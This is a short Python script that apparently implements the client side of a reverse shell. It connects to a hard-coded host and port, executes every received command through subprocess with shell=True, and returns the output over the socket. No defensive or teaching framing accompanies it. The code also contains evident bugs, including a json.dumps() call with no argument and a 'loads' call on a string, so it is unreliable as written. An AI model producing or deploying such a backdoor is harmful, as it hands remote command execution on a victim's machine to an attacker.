#imports and dependencies
import os
import sys
import socket
import threading
import subprocess
import json
# thread recieve function


def cmd_send(sock_fd, data):
    data = json.dumps()
    data = data.encode()
    sock_fd.send(data)

def cmd_recv(sock_fd):
    data = ''
    while True:
        data = data + sock_fd.recv(1024).decode()
        try:
            data = data.loads(data)
            return data
        except:
            continue
        


def main():
    HOST = "127.0.0.1"  # IP address
    PORT = 1234  # Port no. to connect with
    s = socket.socket()
    s.connect((HOST, PORT))
    print("[+] Connection established...")
    while True:
        cmd = cmd_recv(s).decode()
        res = subprocess.check_output(cmd,shell=True)
        s.send(res)


main()  # calling main function
